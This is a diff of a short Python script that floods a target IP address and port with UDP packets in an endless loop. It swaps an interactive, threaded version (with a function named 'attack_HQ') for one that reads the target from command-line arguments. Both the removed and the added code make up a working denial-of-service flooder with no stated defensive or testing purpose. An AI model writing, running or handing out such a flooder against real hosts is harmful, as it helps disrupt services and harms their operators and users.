@@ -1,28 +1,17 @@
 import sys
 import socket
-import threading
+import datetime
 
-print("Enter Input: ")
-user_data = input()
-host, port = user_data.split(' ')
-port = int(port)
+# Defining Variables
+host = str(sys.argv[1])
+port = int(sys.argv[2])
+size = 375
 
-def send_packet(amplifier):
-    try:
-        print("Running......")
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.connect((str(host), int(port)))
-
-        while True:
-            s.send(b"\x99" * amplifier)
-
-    except Exception as e:
-        print("ERROR ", e)
-        return s.close()
-
-def attack_HQ():
-   threading.Thread(target=send_packet(900), daemon=True).start()
-   threading.Thread(target=send_packet(900), daemon=True).start()
-
-attack_HQ()
+# Sending UDP packets on given IP address
+print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + ": Running........")
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.connect((host, port))
+        
+while True:
+    sock.send(b"\x99" * size)
